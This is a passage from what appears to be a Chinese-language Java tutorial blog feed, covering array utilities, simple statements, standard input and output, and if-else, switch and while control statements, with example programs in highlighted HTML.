punctuation">}</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>总结：与数组操作相关的系统函数</strong></font><br><font color="#00B2EE"><strong>（1）使用Arrays.sort来对数组排序</strong></font><br>int x[]=new int[]{3,2,1,4};<br>java.util.Arrays.sort(x);  //对数组x内的元素进行排序（升序）<br>for(int i=0;i &lt; x.length;i++)<br>{<br>      System.out.println(x[i]);<br>}</font></p><p><font color="#00B2EE"><strong>（2）使用Arrays.binarySearch函数对数组进行二分查找</strong></font><br>int [] x=new int[]{2,5,1,6,8,3};<br>java.util.Arrays.sort(x);<br>System.out.println(java.util.Arrays.binarySearch(x,1));   //二分查找，在数组x中查找1，输出0 ;如果没找到，则会输出一个&lt;0的数</p><p><font color="#00B2EE"><strong>（3）使用System.arraycopy函数拷贝数组</strong></font><br>int [] x;<br>x=new int[]{3,1,2,4};<br>int [] y;<br>y=new int[4];<br>System.arraycopy(x,0,y,0,4);<br>//将数组x内的 4个元素拷贝给数组y </p><p><font color="#00B2EE"><strong>（4）使用Ayyars.fill函数填充数组</strong></font><br>int [] x;<br>x=new int[]{3,1,2,4};<br>java.util.Arrays.fill(x,7);    //数组x中的4个元素都改为7<br></p><hr><hr><p>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java学习 </tag>
            
            <tag> Java语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java简单语句、复合语句、控制语句(3.7-3.8)</title>
      <link href="/post/Java-Language-2-3/"/>
      <url>/post/Java-Language-2-3/</url>
      
        <content type="html"><![CDATA[<p>&ensp;<br>&ensp;</p><center><font color="#3CB371" face="Comic sans MS" size="5">简单语句和复合语句 & 控制语句</font></center><p>&emsp;<br>&emsp;</p><h3 id="一、-简单语句和复合语句"><font color="#FF6347" face="Comic sans MS">一、 简单语句和复合语句 </font><a href="post/Java-Language-2-3#一、-简单语句和复合语句"></a></h3><h4 id="1-1-变量定义语句"><font color="#3CB371" face="Comic sans MS">1.1  变量定义语句</font><a href="post/Java-Language-2-3#1-1-变量定义语句"></a></h4><p><font face="Comic sans MS"> 变量定义语句用来定义一个变量，基本格式为：<br>&emsp;&emsp;<font color="red">            类型 变量名1, 变量名2…；</font><br>       例：char c=‘a’;  int i,j=1;<br></font></p><h4 id="1-2-赋值语句"><font color="#3CB371" face="Comic sans MS">1.2  赋值语句</font><a href="post/Java-Language-2-3#1-2-赋值语句"></a></h4><p><font face="Comic sans MS">  赋值语句是将表达式的值赋给变量，其格式为：<br>&emsp;&emsp;<font color="red">变量=表达式；</font><br>      例： char c;  c=‘a’;<br></font></p><h4 id="1-3-方法调用语句"><font color="#3CB371" face="Comic sans MS">1.3  方法调用语句 </font><a href="post/Java-Language-2-3#1-3-方法调用语句"></a></h4><p><font face="Comic sans MS"> 方法调用语句的一般形式为：<br>&emsp;&emsp;<font color="red">对象.方法名( 实参数列表 );</font><br>      例如  System.out.println(“Example!”);<br></font></p><h4 id="1-4-空语句"><font color="#3CB371" face="Comic sans MS">1.4  空语句 </font><a href="post/Java-Language-2-3#1-4-空语句"></a></h4><p><font face="Comic sans MS"> 方法调用语句的一般形式为：<br>&emsp;&emsp;<font color="red">；//这是一条空语句</font><br></font></p><h4 id="1-5-标准输入输出（I-O）"><font color="#3CB371" face="Comic sans MS">1.5  标准输入输出（I/O） </font><a href="post/Java-Language-2-3#1-5-标准输入输出（I-O）"></a></h4><p><font face="Comic sans MS">输入和输出是Java程序的重要组成部分,它提供了人机交互的手段，它们属于方法调用语句。<a href="https://directoree.top/post/Java-IO-1" target="_blank" rel="noopener">具体使用方法参考本博客IO使用方法</a>。</font></p><p><font color="#00B2EE"><strong>1. 输入输出</strong></font><br>       输入是指把需要加工的数据放到程序中,read<br>       输出则把程序处理的结果呈现给用户,write<br><font color="#00B2EE"><strong>2. 标准输入输出</strong></font><br>       一般用键盘作为标准的输入设备<br>       显示器则是标准的输出设备<br><strong>通过System.in和System.out对象分别与键盘和显示器发生联系进行输入和输出。</strong><br></p><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>📒1. 标准输出System.out对象</strong></font><br><font color="#00B2EE">System.out</font>对象中包含的最常用的方法是：<br><font color="#00B2EE">   print<strong>ln</strong>(参数)</font> 向标准输出设备(显示器)打印一行文本并换行<br><font color="#00B2EE">  print(参数)</font> 向标准输出设备(显示器)打印一行文本但不换行<br>   参数类型：boolean , char char[] ,double ,float ,int ,<br>                  long ,  Object,String </font></p><p>  例如：System.out.println(“Example”);<br>           System.out.print(“Input Name”);<br>           int x=2; System.out.print(x);<br></p><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>📒2. 标准输入System.in对象</strong></font><br><font color="#00B2EE"><strong>System.in</strong></font>是字节流,作用是从标准输入读一个字节,常用的方法如下:<br><font color="red">   int read()</font>&emsp;           从流中读取一个字节并将该字节作为整数返回,若没有数据则返回-1<br><font color="red">    int read(byte b[])</font>&emsp; 从流中读取多个字节放到b中, 返回实际读取到的字节数<br><font color="red">   int read(byte b[],int off,int len)</font>&emsp; 从流中读取最多len字节的数据, 放到数组b的下标off开始的单元中，返回读取到的字节数<br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>例3-1<span class="token punctuation">]</span> ReadChar.java 从键盘读一个字符<span class="token function">import</span> java.io.*<span class="token punctuation">;</span>public class ReadChar<span class="token punctuation">{</span>   public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    try<span class="token punctuation">{</span>         char ch<span class="token operator">=</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>System.in.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //将int转换为char         System.out.println<span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>catch<span class="token punctuation">(</span>IOException e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>   <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">[</span>例3-2<span class="token punctuation">]</span> ReadString.java 从键盘读一串字符<span class="token function">import</span> java.io.*<span class="token punctuation">;</span>    public class ReadString<span class="token punctuation">{</span> public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>  char c<span class="token punctuation">;</span>         try<span class="token punctuation">{</span>            <span class="token keyword">do</span>           <span class="token punctuation">{</span>  c<span class="token operator">=</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>System.in.read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  //使用循环来从输入流中读取一转字符              System.out.print<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>while<span class="token punctuation">(</span>c<span class="token operator">!=</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>catch<span class="token punctuation">(</span>IOException e<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token punctuation">}</span>                         <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">[</span>例3-3<span class="token punctuation">]</span> ReadStringOrInt.java 从键盘读一数字串或一个整数<span class="token function">import</span> java.io.*<span class="token punctuation">;</span>class ReadStringOrInt<span class="token punctuation">{</span>    public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          byte buf<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>new byte<span class="token punctuation">[</span>20<span class="token punctuation">]</span><span class="token punctuation">;</span>            String str<span class="token punctuation">;</span>           int anInt<span class="token punctuation">;</span>                   try<span class="token punctuation">{</span>                   System.in.read<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>                str<span class="token operator">=</span>new String<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>              anInt<span class="token operator">=</span>Integer.parseInt<span class="token punctuation">(</span>str.trim<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>          catch<span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token punctuation">}</span>          <span class="token punctuation">}</span><span class="token punctuation">}</span>//要将数字串转换成实数，则：   float  f<span class="token operator">=</span>Float.parseFloat<span class="token punctuation">(</span>str.trim<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>        //转成单精度数  double d<span class="token operator">=</span>Double.parseDouble<span class="token punctuation">(</span>str.trim<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>      //转成双精度数  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><blockquote><p>思考：如何接收用户向程序输入的参数?<br>通过System.in<br>通过main（String[] args）中的形参<br>class test{<br>public static void main(String[] args){<br>   System.out.println(args[0]);<br>   System.out.println(args[1]);<br>}<br>}<br>java test s1 s2<br>s1<br>s2</p></blockquote></blockquote><hr><hr><p>&emsp;</p><h3 id="二、-控制语句句"><font color="#FF6347" face="Comic sans MS">二、 控制语句句 </font><a href="post/Java-Language-2-3#二、-控制语句句"></a></h3><ul><li>[ ]2.1选择语句<ul><li>2.1.1 if-else语句  </li><li>2.1.2 switch语句</li></ul></li><li>[ ]2.2循环语句 <ul><li>2.2.1 while 语句 </li><li>2.2.2 do-while 语句</li><li>2.2.3 for 语句</li><li>2.2.4 循环的嵌套</li></ul></li><li>[ ]2.3跳转语句  <ul><li>2.3.1 break语句</li><li>2.3.2 continue语句</li><li>2.3.3 return 语句 </li></ul></li></ul><h4 id="2-1-选择语句"><font color="#3CB371" face="Comic sans MS">2.1  选择语句</font><a href="post/Java-Language-2-3#2-1-选择语句"></a></h4><h5 id="if-else语句"><font color="#00B2EE" face="Comic sans MS">  if-else语句</font><a href="post/Java-Language-2-3#if-else语句"></a></h5><p><font face="Comic sans MS"><font color="red"><strong>📒if-else语句的语法形式：</strong></font><br>       if  (布尔表达式)<br>         {    语句块1   }<br>       [ else<br>          {   语句块2      }  ]<br>     若语句块1，语句块2也是if-else语句便形成嵌套<br></font></p><pre class="line-numbers language-java"><code class="language-java">例［<span class="token number">3</span><span class="token operator">-</span><span class="token number">4</span>］：三个整数a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c，要求按从小到大的次序输出解题思路：对a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c进行排序。先找出a、b、c中最小的，然后比较剩下的两个。算法：            ①如果a<span class="token operator">></span>b，则将a和b互换（使得a是a、b中小的那个）        ②如果a<span class="token operator">></span>c，则将a和c互换（使得a是a、b、c中最小的）        ③如果b<span class="token operator">></span>c，则将b和c互换（最后c最大，b次之，a最小）代码如下：     <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token operator">></span>b<span class="token punctuation">)</span>    <span class="token punctuation">{</span>          t<span class="token operator">=</span>a<span class="token punctuation">;</span>a<span class="token operator">=</span>b<span class="token punctuation">;</span>b<span class="token operator">=</span>t<span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token operator">></span>c<span class="token punctuation">)</span>    <span class="token punctuation">{</span>          t<span class="token operator">=</span>a<span class="token punctuation">;</span>a<span class="token operator">=</span>c<span class="token punctuation">;</span>c<span class="token operator">=</span>t<span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>b<span class="token operator">></span>c<span class="token punctuation">)</span>    <span class="token punctuation">{</span>          t<span class="token operator">=</span>b<span class="token punctuation">;</span>b<span class="token operator">=</span>c<span class="token punctuation">;</span>c<span class="token operator">=</span>t<span class="token punctuation">;</span>     <span class="token punctuation">}</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token operator">+</span><span class="token string">"&lt; "</span> <span class="token operator">+</span>b<span class="token operator">+</span><span class="token string">"&lt; "</span> <span class="token operator">+</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS"><font color="red">**📒  if–else 语句的嵌套**</font>    if-else语句中内嵌的语句1或语句2又是if-else语句的情况称为if-else语句的嵌套。如：      if（布尔表达式1）           语句1      else if（布尔表达式2）                 语句2                 …             else if (布尔表达式m)                        语句m                    else  语句n</font></td></tr></table></div></div><pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">[</span>例<span class="token number">3</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">]</span> 求一元二次方程<span class="token punctuation">(</span>aX2<span class="token operator">+</span>bX<span class="token operator">+</span>c<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>的根：<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">roots</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>        <span class="token keyword">float</span> x1<span class="token punctuation">,</span>x2<span class="token punctuation">;</span>        <span class="token keyword">int</span> check<span class="token punctuation">;</span>        a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>b<span class="token operator">=</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        check<span class="token operator">=</span>b<span class="token operator">*</span>b<span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span>a<span class="token operator">*</span>c<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>check<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            x1<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>            x2<span class="token operator">=</span>x1<span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"x1="</span><span class="token operator">+</span>x1<span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"x2="</span><span class="token operator">+</span>x2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>     <span class="token keyword">else</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>check<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          x1<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">-</span>b<span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span>Math<span class="token punctuation">.</span><span class="token function">sqrt</span><span class="token punctuation">(</span>check<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>          x2<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">-</span>b<span class="token operator">-</span><span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span>Math<span class="token punctuation">.</span><span class="token function">sqrt</span><span class="token punctuation">(</span>check<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>          System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"x1="</span><span class="token operator">+</span>x1<span class="token punctuation">)</span><span class="token punctuation">;</span>          System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"x2="</span><span class="token operator">+</span>x2<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>         <span class="token keyword">else</span>         <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">/*请自己填写*/</span>   <span class="token punctuation">}</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java"><code class="language-java">课堂练习：求最小数<span class="token keyword">import</span>  java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span>             <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Min</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>    <span class="token keyword">byte</span> buf<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">byte</span><span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     String str <span class="token punctuation">;</span>  <span class="token keyword">int</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> min<span class="token punctuation">;</span>       System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"请输入二个整数："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       System<span class="token punctuation">.</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//从键盘读一数字串存于buf中</span>   str<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//buf 转换成字符串 </span>   a<span class="token operator">=</span>Integer<span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//数字串转换成整数</span>   System<span class="token punctuation">.</span>in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    str<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>                      b<span class="token operator">=</span>Integer<span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           min<span class="token operator">=</span>a<span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>min<span class="token operator">></span>b<span class="token punctuation">)</span> min<span class="token operator">=</span>b<span class="token punctuation">;</span>   System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"最小数是"</span><span class="token operator">+</span>min<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h5 id="switch-语句"><font color="#00B2EE" face="Comic sans MS">  switch  语句</font><a href="post/Java-Language-2-3#switch-语句"></a></h5><p><font face="Comic sans MS"><strong>switch语句根据表达式的结果来执行多个可能操作中的一个，它的语法形式如下：</strong><br></font></p><pre class="line-numbers language-java"><code class="language-java">  <span class="token keyword">switch</span><span class="token punctuation">(</span>表达式<span class="token punctuation">)</span>  <span class="token punctuation">{</span>   <span class="token keyword">case</span> 常量<span class="token number">1</span>：语句<span class="token number">1</span>                    <span class="token punctuation">[</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">]</span>   <span class="token keyword">case</span> 常量<span class="token number">2</span>：语句<span class="token number">2</span>                  <span class="token punctuation">[</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">]</span>   …   <span class="token keyword">case</span> 常量n：语句n                   <span class="token punctuation">[</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">]</span>   <span class="token punctuation">[</span><span class="token keyword">default</span><span class="token operator">:</span> 缺省处理语句                   <span class="token keyword">break</span>；<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">//这儿的break语句不必要</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>注意：</strong></font> <font color="red">“case 常量”</font>只起语句标号的作用，并非在该处进行条件判断。在执行switch语句时，根据switch括号中表达式的值找到匹配的入口标号，就从此标号所标记的语句开始执行下去，<font color="red">不再进行判断，直到遇到break语句为止。</font><br></font></p><pre class="line-numbers language-bash"><code class="language-bash">演示有break及没有break的情况public class switchBreak<span class="token punctuation">{</span>      public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>   …         switch<span class="token punctuation">(</span>2<span class="token punctuation">)</span>         <span class="token punctuation">{</span>           <span class="token keyword">case</span> 1: System.out.println<span class="token punctuation">(</span><span class="token string">"case1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token keyword">case</span> 2: System.out.println<span class="token punctuation">(</span><span class="token string">"case2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token keyword">case</span> 3: System.out.println<span class="token punctuation">(</span><span class="token string">"case3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token keyword">break</span><span class="token punctuation">;</span>          default: System.out.println<span class="token punctuation">(</span><span class="token string">"default"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>使用switch-case必须注意:</strong></font><br><font color="#00B2EE"><strong>1.</strong></font> 表达式必须是符合byte,char,short和int类型的表达式,不能是浮点类型或字符串，case子句中常量的类型必须与表达式的类型相容,且每个常量必须不同；<br><font color="#00B2EE"><strong>2.</strong></font> case后面可以有多条语句，不用加{}；<br><font color="#00B2EE"><strong>3.</strong></font> default子句是可选的。如果有default，当表达式的值与case子句的值都不匹配时就会执行default分支，如果既没匹配也没default，那就什么也不执行；<br><font color="#00B2EE"><strong>4.</strong></font> break为跳转语句，表示跳出switch结构，即终止switch语句的执行。如果没有break语句，则switch在执行完一个case分支后，流程控制转移到下一个case继续执行，不再匹配，直到遇到break为止。<br><font color="#00B2EE"><strong>5.</strong></font> 多个case子句可以共享相同的语句块；<br><font color="#00B2EE"><strong>6.</strong></font> 通过if-else语句可以实现switch语句所有的功能。但通常使用switch语句更简练，且可读性强，程序的执行效率也高；<br><font color="#00B2EE"><strong>7.</strong></font> if-else语句可以基于一个范围内的值或一个条件来进行不同的操作，但switch语句中的每个case子句都必须对应一个单值。<br></font></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>例3-6<span class="token punctuation">]</span> 用switch语句判断一个月份属于一年哪个季节<span class="token punctuation">(</span>春、夏、秋、冬<span class="token punctuation">)</span>。class SwitchDemo<span class="token punctuation">{</span> public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   int month<span class="token operator">=</span>7<span class="token punctuation">;</span>  String season<span class="token punctuation">;</span>  switch <span class="token punctuation">(</span>month<span class="token punctuation">)</span>     //值为12、1和2时将都执行：season<span class="token operator">=</span><span class="token string">"冬季"</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span>  <span class="token punctuation">{</span> <span class="token keyword">case</span>  12:     <span class="token keyword">case</span>  1:    <span class="token keyword">case</span>  2:      season<span class="token operator">=</span><span class="token string">"冬季"</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span>  3:    <span class="token keyword">case</span>  4:    <span class="token keyword">case</span>  5:      season<span class="token operator">=</span><span class="token string">"春季"</span>；      <span class="token keyword">break</span><span class="token punctuation">;</span>   <span class="token keyword">case</span>  6:   <span class="token keyword">case</span>  7:   <span class="token keyword">case</span>  8:  season<span class="token operator">=</span><span class="token string">"夏季"</span><span class="token punctuation">;</span>                  <span class="token keyword">break</span><span class="token punctuation">;</span>   <span class="token keyword">case</span>  9:   <span class="token keyword">case</span>  10:   <span class="token keyword">case</span>  11: season<span class="token operator">=</span><span class="token string">"秋季"</span>；                 <span class="token keyword">break</span><span class="token punctuation">;</span>   default:  season<span class="token operator">=</span><span class="token string">"错!"</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>   System.out.println<span class="token punctuation">(</span><span class="token string">"月份    季节"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   System.out.println<span class="token punctuation">(</span>month+<span class="token string">"    "</span>+season<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>该程序运行后输出：月份    季节                 7      夏季<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="2-2-循环语句"><font color="#3CB371" face="Comic sans MS">2.2  循环语句</font><a href="post/Java-Language-2-3#2-2-循环语句"></a></h4><h5 id="while-语句"><font color="#00B2EE" face="Comic sans MS">while  语句  </font><a href="post/Java-Language-2-3#while-语句"></a></h5><p><font face="Comic sans MS">while语句形式如下：<br>&emsp;&emsp;<font color="red">     while (布尔表达式) {语句块}  </font><br><strong>说明：</strong>while：语句的关键字； 布尔表达式：循环条件； 语句块：循环体，是一个语句，若是多个语句则应构成复合语句。<br></font> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>例3-7<span class="token punctuation">]</span> Sum1.java用while循环语句计算s<span class="token operator">=</span>1+1/2+1/3+…+1/100class Sum <span class="token punctuation">{</span>  public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    int n<span class="token operator">=</span>100<span class="token punctuation">;</span>　                //循环总数n<span class="token operator">=</span>100    int  i<span class="token operator">=</span>1<span class="token punctuation">;</span>　　     　　      //循环次数，初值为１    float s<span class="token operator">=</span>0<span class="token punctuation">;</span>                 //和s为实型    <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>100<span class="token punctuation">)</span> 　　　      //循环条件,循环总数100    <span class="token punctuation">{</span>     s<span class="token operator">=</span>s+<span class="token punctuation">(</span>1.0f/i<span class="token punctuation">)</span><span class="token punctuation">;</span>            //s增加1/i ,1.0f表示是float型     i++<span class="token punctuation">;</span>                    //循环次数加１    <span class="token punctuation">}</span>    System.out.println<span class="token punctuation">(</span>“s<span class="token operator">=</span>”+s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>                              <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h5 id="do-while-语句"><font color="#00B2EE" face="Comic sans MS">do-while  语句  </font><a href="post/Java-Language-2-3#do-while-语句"></a></h5><p><font face="Comic sans 